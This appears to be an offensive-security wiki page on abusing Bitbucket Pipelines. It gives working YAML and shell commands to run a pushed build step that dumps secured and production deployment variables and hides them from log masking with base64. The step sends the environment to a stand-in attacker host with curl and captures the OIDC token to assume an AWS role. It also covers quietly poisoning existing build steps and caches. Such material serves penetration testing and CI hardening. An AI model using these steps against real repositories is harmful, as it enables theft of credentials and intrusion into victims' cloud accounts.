---
title: "Pipelines abuse"
description: "Turning a Bitbucket Pipelines build into code execution: triggering bitbucket-pipelines.yml from a branch or pull request you can push, exfiltrating repository and secured variables by defeating log masking, and reaching deployment-environment credentials and OIDC-brokered cloud roles."
keywords:
  - Bitbucket Pipelines
  - secured variables
  - pipeline injection
  - deployment variables
  - OIDC
---

# Pipelines abuse

Bitbucket Pipelines runs the steps defined in `bitbucket-pipelines.yml` inside a Docker container on push. Those steps execute with the repository's **variables** injected as environment variables, including ones marked **secured**, plus any **deployment environment** variables when the step targets an environment, plus an **OIDC** identity token when the step requests one. Because the YAML lives in the repository and runs on a branch, **anyone who can push a branch runs their own step with those credentials**. This is the core of the abuse: you do not need to find a vulnerability, you supply the build script.

## Fingerprint and preconditions

You need, at minimum, write access to one branch of a repository that has Pipelines enabled, or the ability to open a pull request that triggers a `pull-requests` pipeline.

```bash
AUTH=(-u "$BB_USER:$BB_APP_PASSWORD")

# Is Pipelines enabled on the repo
curl -s "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines_config | jq '.enabled'

# Which variable NAMES exist at repo scope (values of secured ones are hidden)
curl -s "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines_config/variables/ | \
  jq -r '.values[] | "\(.key)\tsecured=\(.secured)"'

# Which deployment environments exist (each carries its own variables)
curl -s "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/environments/ | \
  jq -r '.values[] | "\(.name)\t\(.uuid)"'
```

`enabled=true` and a list of variable names is the green light. A `secured=true` variable such as `AWS_SECRET_ACCESS_KEY` or `NPM_TOKEN` is the target: the UI hides its value and the API refuses to return it, but a running step reads it in cleartext. Deployment environments named `Production` or `staging` usually hold the strongest credentials.

## Why secured variables are still exfiltrable

A secured variable is **masked in build logs**, not withheld from the step. Bitbucket scans log output and replaces exact matches of the secret value with `****`. The masking is a literal substring match, so any transformation of the value before it reaches the log defeats it: base64, reversing, inserting separators, or hashing-then-leaking out of band all produce output that does not match the stored secret and therefore is printed verbatim.

## Worked exfiltration step

Push this `bitbucket-pipelines.yml` (or add a branch-specific pipeline) to a branch you control. The `custom:` pipeline only runs when triggered manually or you place the logic under your branch; a `branches:` entry scoped to your branch runs automatically on push.

```yaml
image: atlassian/default-image:4

pipelines:
  branches:
    'feature/ci-debug':          # a branch you can push; this runs automatically on push
      - step:
          name: collect
          deployment: production  # pulls the Production environment variables into this step
          oidc: true              # requests an OIDC identity token for cloud federation
          script:
            # Defeat log masking: base64 every secret so the literal value never appears
            - env | grep -iE 'TOKEN|SECRET|KEY|PASSWORD|AWS|NPM' | base64 -w0; echo
            # Exfiltrate out of band so it survives even if the log is reviewed
            - curl -s -X POST https://attacker.example/c -d "$(env | base64 -w0)"
            # The OIDC assertion, used to assume a cloud role below
            - echo "$BITBUCKET_STEP_OIDC_TOKEN" | base64 -w0; echo
```

```bash
# Trigger by pushing the branch
git checkout -b feature/ci-debug
git add bitbucket-pipelines.yml && git commit -m "ci" && git push origin feature/ci-debug

# Read the result from the build log via the API
PIPE=$(curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines/?sort=-created_on&pagelen=1" \
  | jq -r '.values[0].uuid')
curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines/$PIPE/steps/" \
  | jq -r '.values[].uuid'
# then fetch the step log; the base64 blob decodes to the cleartext secrets
curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines/$PIPE/steps/$STEP/log" \
  | grep -Ao '[A-Za-z0-9+/=]{40,}' | base64 -d
```

Interpret the log: the `base64 -w0` blob is your secrets with masking defeated; pipe it back through `base64 -d` locally. If `deployment: production` was accepted, the environment's variables are in that same dump. If `oidc: true` produced a `$BITBUCKET_STEP_OIDC_TOKEN`, you now hold a short-lived signed JWT for cloud federation.

## Variants

- **Default and pull-request pipelines**: if you cannot add a `branches:` entry but a `default:` or `pull-requests:` pipeline exists, open a PR from a branch you pushed; the PR pipeline runs with the repository variables. Confirm whether secured and deployment variables are exposed to PR builds in that workspace, since this is the one place a workspace can restrict them.
- **Poisoning an existing step**: instead of a new step, append your `script` lines to the repo's real build step so the pipeline looks normal and still deploys, reducing the chance anyone looks at the log.
- **Custom pipeline with inputs**: a `custom:` pipeline can be triggered through the API (`POST /pipelines/` with a `target` selector) without pushing a visible branch, useful when branch creation is restricted but pipeline-trigger permission is not.
- **Cache and artifact poisoning**: a step can write to the shared `caches:` or publish `artifacts:` that a later privileged pipeline consumes, moving your payload into a build you could not trigger directly.

## Follow-on

- **Deployment credentials**: the `production`/`staging` environment variables are typically cloud deploy keys, registry tokens, or SSH keys; each is a pivot into the target it deploys to.
- **OIDC to cloud**: exchange `$BITBUCKET_STEP_OIDC_TOKEN` for cloud credentials. For AWS, the pipeline's identity provider is the workspace OIDC issuer and the token's `sub` encodes the repository and step; assume the trusting role:

```bash
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789012:role/bitbucket-deploy \
  --role-session-name p --web-identity-token "$BITBUCKET_STEP_OIDC_TOKEN" \
  | jq '.Credentials'
```

  The returned keys drop you into the [AWS](../../cloud/aws/index.md) path with the deploy role's permissions.
- **Token looting**: any Bitbucket access token present as a variable loops back into [Token and app-password abuse](token-and-app-password-abuse.md).

## Notes

- Masking is exact-match only; even `echo "${SECRET:0:20}"; echo "${SECRET:20}"` prints both halves unmasked because neither half equals the stored value.
- The OIDC token is per step and short-lived; capture and use it within the same build window, or exfiltrate and assume the role immediately.
- A step receives a deployment environment's variables only when it declares `deployment: <env>` and the environment has no deployment restriction you fail to meet. An unrestricted environment hands its variables to any branch that declares it, which is the common misconfiguration to look for; an environment with branch, admin, or custom restrictions pauses or blocks the deployment and the step gets no variables, so confirm the environment is unrestricted (or that your branch satisfies the restriction) before relying on this.
- Bitbucket Data Center/Server has no Pipelines; the equivalent CI abuse there targets the connected Bamboo or external runner, not this file.

## Tools

- **git**: push the branch or PR that triggers the pipeline.
- **curl** / **jq**: trigger custom pipelines and read step logs through the 2.0 API.
- **base64** / **xxd**: transform secured values to defeat exact-match log masking.
- **aws-cli** (`assume-role-with-web-identity`): exchange the OIDC token for cloud credentials.

## References

- [Bitbucket Pipelines: variables and secrets](https://support.atlassian.com/bitbucket-cloud/docs/variables-and-secrets/)
- [Bitbucket Pipelines: using OpenID Connect](https://support.atlassian.com/bitbucket-cloud/docs/integrate-pipelines-with-resource-servers-using-oidc/)
- [Bitbucket Pipelines: deployments and environments](https://support.atlassian.com/bitbucket-cloud/docs/set-up-and-monitor-bitbucket-deployments/)
- [HackTricks Cloud: Bitbucket security](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/bitbucket-security/index.html)
- [Bitbucket Pipelines REST API](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-pipelines/)
